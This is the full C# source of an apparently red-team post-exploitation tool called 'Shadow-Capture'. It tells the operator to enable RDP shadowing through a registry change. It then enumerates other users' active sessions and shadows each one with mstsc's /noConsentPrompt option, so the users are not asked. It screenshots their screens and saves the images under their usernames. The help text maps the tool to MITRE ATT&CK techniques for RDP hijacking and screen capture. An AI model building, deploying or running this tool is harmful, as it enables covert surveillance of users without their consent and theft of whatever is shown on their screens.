using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace RDPShadowCapture
{
    class Program
    {
        // Win32 API imports for screenshot capture
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
            IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("kernel32.dll")]
        private static extern uint WTSGetActiveConsoleSessionId();

        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private const int SRCCOPY = 0x00CC0020;
        private const int SW_RESTORE = 9;

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Shadow-Capture");

            // Show help
            if (args.Contains("--help") || args.Contains("-h"))
            {
                ShowHelp();
                return;
            }

            // Check admin privileges automatically
            if (!CheckAdminPrivileges())
            {
                Console.WriteLine("[!] ERROR: Administrator privileges required");
                Console.WriteLine("[!] Please run this tool as Administrator");
                Environment.Exit(1);
            }

            Console.WriteLine("[+] Running with Administrator privileges\n");

            // Show RDP shadowing configuration instructions
            Console.WriteLine("[*] PREREQUISITE: RDP Shadowing must be enabled");
            Console.WriteLine("[*] Enable with:  reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /V Shadow /T REG_DWORD /D 2 /F");
            Console.WriteLine("[*] Disable with: reg.exe delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /V Shadow");
            Console.WriteLine();

            string outputDir = ".";
            int maxThreads = 3; // Default concurrent sessions

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-t" || args[i] == "--threads")
                {
                    if (i + 1 < args.Length && int.TryParse(args[i + 1], out int threads))
                    {
                        maxThreads = Math.Max(1, Math.Min(threads, 10)); // Limit 1-10
                        i++;
                    }
                }
                else if (!args[i].StartsWith("-"))
                {
                    outputDir = args[i];
                }
            }

            if (!Directory.Exists(outputDir))
            {
                Console.WriteLine($"[*] Creating output directory: {outputDir}");
                Directory.CreateDirectory(outputDir);
            }

            Console.WriteLine($"[*] Max concurrent captures: {maxThreads}");

            // Get current session ID
            int currentSessionId = GetCurrentSessionId();
            Console.WriteLine($"[*] Current session ID: {currentSessionId}");

            try
            {
                // Enumerate sessions
                Console.WriteLine("[*] Enumerating active sessions...");
                List<SessionInfo> sessions = GetActiveSessions();

                if (sessions.Count == 0)
                {
                    Console.WriteLine("[!] No active sessions found");
                    return;
                }

                Console.WriteLine($"[+] Found {sessions.Count} total session(s)\n");

                // Filter out current session, disconnected sessions
                var ownSession = sessions.Where(s => s.Id == currentSessionId).ToList();
                var disconnectedSessions = sessions.Where(s => s.State.Equals("Disc", StringComparison.OrdinalIgnoreCase)).ToList();
                var activeSessions = sessions.Where(s =>
                    s.Id != currentSessionId &&
                    !s.State.Equals("Disc", StringComparison.OrdinalIgnoreCase)).ToList();

                // Report filtered sessions
                if (ownSession.Count > 0)
                {
                    Console.WriteLine($"[!] Skipping own session:");
                    foreach (var s in ownSession)
                        Console.WriteLine($"    Session ID {s.Id} - User: {s.Username} (current user)");
                }

                if (disconnectedSessions.Count > 0)
                {
                    Console.WriteLine($"[!] Skipping {disconnectedSessions.Count} disconnected session(s):");
                    foreach (var s in disconnectedSessions)
                        Console.WriteLine($"    Session ID {s.Id} - User: {s.Username}");
                }

                if (ownSession.Count > 0 || disconnectedSessions.Count > 0)
                    Console.WriteLine();

                if (activeSessions.Count == 0)
                {
                    Console.WriteLine("[!] No capturable sessions found");
                    return;
                }

                // Process sessions with thread pool
                Console.WriteLine($"[*] Processing {activeSessions.Count} active session(s)...\n");

                var results = new ConcurrentBag<CaptureResult>();
                var semaphore = new SemaphoreSlim(maxThreads);
                var tasks = new List<Task>();

                foreach (var session in activeSessions)
                {
                    var currentSession = session; // Capture for closure

                    tasks.Add(Task.Run(async () =>
                    {
                        await semaphore.WaitAsync();
                        try
                        {
                            var result = ProcessSession(currentSession, outputDir);
                            results.Add(result);
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }));
                }

                Task.WaitAll(tasks.ToArray());

                // Summary
                int successCount = results.Count(r => r.Success);
                Console.WriteLine($"\n[+] Capture complete: {successCount}/{activeSessions.Count} sessions captured");

                var failures = results.Where(r => !r.Success).ToList();
                if (failures.Count > 0)
                {
                    Console.WriteLine($"[!] Failed captures:");
                    foreach (var f in failures)
                        Console.WriteLine($"    Session {f.SessionId} ({f.Username}): {f.ErrorMessage}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] ERROR: {ex.Message}");
            }
            finally
            {
                Console.WriteLine("\n[+] Done");
            }
        }

        static void ShowHelp()
        {
            Console.WriteLine("USAGE:");
            Console.WriteLine("  shadow-capture.exe [output_dir] [-t threads]");
            Console.WriteLine();
            Console.WriteLine("ARGUMENTS:");
            Console.WriteLine("  output_dir          Directory to save screenshots (default: current directory)");
            Console.WriteLine("  -t, --threads N     Number of concurrent captures (1-10, default: 3)");
            Console.WriteLine("  -h, --help          Show this help message");
            Console.WriteLine();
            Console.WriteLine("PREREQUISITES:");
            Console.WriteLine("  1. Run as Administrator");
            Console.WriteLine("  2. Enable RDP shadowing with:");
            Console.WriteLine("     reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /V Shadow /T REG_DWORD /D 2 /F");
            Console.WriteLine();
            Console.WriteLine("  To disable RDP shadowing after use:");
            Console.WriteLine("     reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /V Shadow /F");
            Console.WriteLine();
            Console.WriteLine("EXAMPLES:");
            Console.WriteLine("  shadow-capture.exe");
            Console.WriteLine("  shadow-capture.exe C:\\captures");
            Console.WriteLine("  shadow-capture.exe C:\\captures -t 5");
            Console.WriteLine();
            Console.WriteLine("MITRE ATT&CK:");
            Console.WriteLine("  T1021.001 - Remote Services: Remote Desktop Protocol");
            Console.WriteLine("  T1563.002 - Remote Service Session Hijacking: RDP Hijacking");
            Console.WriteLine("  T1113     - Screen Capture");
            Console.WriteLine();
            Console.WriteLine("\"...each must possess some centre of power. Some locus. Call it what you will. Control that, and one controls the entire Realm!\"");
            Console.WriteLine();
        }

        static bool CheckAdminPrivileges()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        static int GetCurrentSessionId()
        {
            try
            {
                // Get session ID of current process
                return Process.GetCurrentProcess().SessionId;
            }
            catch
            {
                return -1;
            }
        }

        static List<SessionInfo> GetActiveSessions()
        {
            List<SessionInfo> sessions = new List<SessionInfo>();

            try
            {
                string output = ExecuteCommand("quser.exe", "");
                string[] lines = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

                foreach (string line in lines.Skip(1)) // Skip header
                {
                    // Parse quser output format
                    Match match = Regex.Match(line.Trim(), @"^(\S+)\s+(\S+)?\s+(\d+)\s+(\w+)");

                    if (match.Success)
                    {
                        sessions.Add(new SessionInfo
                        {
                            Username = match.Groups[1].Value,
                            Id = int.Parse(match.Groups[3].Value),
                            State = match.Groups[4].Value
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Session enumeration error: {ex.Message}");
            }

            return sessions;
        }

        static CaptureResult ProcessSession(SessionInfo session, string outputDir)
        {
            lock (Console.Out)
            {
                Console.WriteLine($"[*] Thread {Thread.CurrentThread.ManagedThreadId}: Processing Session {session.Id} - {session.Username}");
            }

            Process shadowProcess = null;

            try
            {
                // Launch shadow session
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "mstsc.exe",
                    Arguments = $"/shadow:{session.Id} /noConsentPrompt",
                    UseShellExecute = false,
                    CreateNoWindow = false
                };

                shadowProcess = Process.Start(psi);

                // Wait for shadow window to establish
                Thread.Sleep(3000);

                // Find mstsc window
                IntPtr shadowWindow = FindWindowByProcessId(shadowProcess.Id);

                if (shadowWindow == IntPtr.Zero)
                {
                    return new CaptureResult
                    {
                        SessionId = session.Id,
                        Username = session.Username,
                        Success = false,
                        ErrorMessage = "Could not find shadow window"
                    };
                }

                // Bring window to foreground
                SetForegroundWindow(shadowWindow);
                ShowWindow(shadowWindow, SW_RESTORE);
                Thread.Sleep(500);

                // Capture screenshot
                Bitmap screenshot = CaptureWindow(shadowWindow);

                if (screenshot == null)
                {
                    return new CaptureResult
                    {
                        SessionId = session.Id,
                        Username = session.Username,
                        Success = false,
                        ErrorMessage = "Screenshot capture failed"
                    };
                }

                // Save screenshot
                string filename = $"{Environment.MachineName}_{session.Id}_{session.Username}_{DateTime.Now:yyyyMMdd_HHmmss}.png";
                string filepath = Path.Combine(outputDir, filename);

                lock (typeof(Program)) // File system operations lock
                {
                    screenshot.Save(filepath, ImageFormat.Png);
                }

                screenshot.Dispose();

                lock (Console.Out)
                {
                    Console.WriteLine($"[+] Thread {Thread.CurrentThread.ManagedThreadId}: Captured session {session.Id} -> {filename}");
                }

                return new CaptureResult
                {
                    SessionId = session.Id,
                    Username = session.Username,
                    Success = true,
                    Filename = filename
                };
            }
            catch (Exception ex)
            {
                lock (Console.Out)
                {
                    Console.WriteLine($"[!] Thread {Thread.CurrentThread.ManagedThreadId}: Error capturing session {session.Id}: {ex.Message}");
                }

                return new CaptureResult
                {
                    SessionId = session.Id,
                    Username = session.Username,
                    Success = false,
                    ErrorMessage = ex.Message
                };
            }
            finally
            {
                // Close shadow session
                if (shadowProcess != null && !shadowProcess.HasExited)
                {
                    try
                    {
                        shadowProcess.Kill();
                        shadowProcess.Dispose();
                    }
                    catch { }
                }
            }
        }

        static bool ShadowAndCapture(SessionInfo session, string outputDir)
        {
            var result = ProcessSession(session, outputDir);
            return result.Success;
        }

        static IntPtr FindWindowByProcessId(int processId)
        {
            Process process = Process.GetProcessById(processId);

            // Wait for main window handle
            for (int i = 0; i < 10; i++)
            {
                if (process.MainWindowHandle != IntPtr.Zero)
                    return process.MainWindowHandle;

                Thread.Sleep(300);
                process.Refresh();
            }

            return IntPtr.Zero;
        }

        static Bitmap CaptureWindow(IntPtr hWnd)
        {
            try
            {
                RECT rect;
                GetWindowRect(hWnd, out rect);

                int width = rect.Right - rect.Left;
                int height = rect.Bottom - rect.Top;

                if (width <= 0 || height <= 0)
                    return null;

                IntPtr hdcSrc = GetWindowDC(hWnd);
                IntPtr hdcDest = CreateCompatibleDC(hdcSrc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdcSrc, width, height);
                IntPtr hOld = SelectObject(hdcDest, hBitmap);

                BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, SRCCOPY);

                SelectObject(hdcDest, hOld);
                DeleteDC(hdcDest);
                ReleaseDC(hWnd, hdcSrc);

                Bitmap bitmap = System.Drawing.Image.FromHbitmap(hBitmap);
                DeleteObject(hBitmap);

                return bitmap;
            }
            catch
            {
                return null;
            }
        }

        static string ExecuteCommand(string filename, string arguments)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = filename,
                    Arguments = arguments,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    return output;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Command execution error: {ex.Message}");
                return string.Empty;
            }
        }

        class SessionInfo
        {
            public string Username { get; set; }
            public int Id { get; set; }
            public string State { get; set; }
        }

        class CaptureResult
        {
            public int SessionId { get; set; }
            public string Username { get; set; }
            public bool Success { get; set; }
            public string Filename { get; set; }
            public string ErrorMessage { get; set; }
        }
    }
}